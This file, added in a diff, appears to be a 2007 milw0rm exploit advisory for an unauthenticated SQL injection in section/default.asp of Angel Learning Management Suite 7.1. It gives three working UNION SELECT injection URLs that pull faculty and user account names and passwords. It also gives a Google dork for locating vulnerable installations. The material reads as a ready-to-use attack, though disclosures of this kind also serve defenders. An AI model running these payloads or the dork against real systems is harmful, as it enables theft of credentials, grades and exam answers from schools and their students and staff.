@@ -1,0 +1,61 @@
+#########################################################################
+#
+# Application:
+#
+#		Angel Learning Management Suite 7.1
+#		http://www.angellearning.com
+#
+#########################################################################
+#
+# Description:
+#
+#		"ANGEL LMS is an inclusive suite of enterprise 
+#		learning management tools that balances ease of 
+#		use with powerful capabilities to deliver leading 
+#		edge teaching and learning, impact learner success 
+#		and measure effectiveness."
+#
+#		Basically, Angel is a CMS for education, providing
+#		online forums, grading, email, chat, etc to faculty
+#		and students. It is used as the primary Web interface
+#		for several online schools and courses.
+#
+#########################################################################
+#
+# Vulnerability:
+#
+#		Angel 7.1 contains an SQL injection vulnerability in 
+#		section/default.asp that grants an un-authenticated user 
+#		access to all database tables and data. Examples include 
+#		enumeration of tables, columns, user names, passwords, 
+#		grades, and test questions/answers (you basically have 
+#		access to everything).
+#	
+#########################################################################
+#	
+# Exploit Examples:
+#
+#	#Enumerate Faculty User Accounts#
+#		http://[Angel Root Directory]/section/default.asp?id='%20union%20select%20top%201%20username%20from%20faculty_accounts--"
+#		
+#	#Enumerate All User Accounts#
+#		http://[Angel Root Directory]/section/default.asp?id='%20union%20select%20top%201%20username%20from%20accounts--"
+#
+#	#Enumerate Account Passwords#
+#		http://[Angel Root Directory]/section/default.asp?id='%20union%20select%20top%201%20password%20from%20accounts--"
+#
+#########################################################################
+#
+# Google Dork:
+#		intext:"2006 angel learning, inc" -pdf
+#
+#########################################################################
+#
+# Credit:
+#	Exploit discovered and coded by Craig Heffner
+#	heffnercj [at] gmail.com
+#	http://www.craigheffner.com
+#
+#########################################################################
+
+# milw0rm.com [2007-03-01]
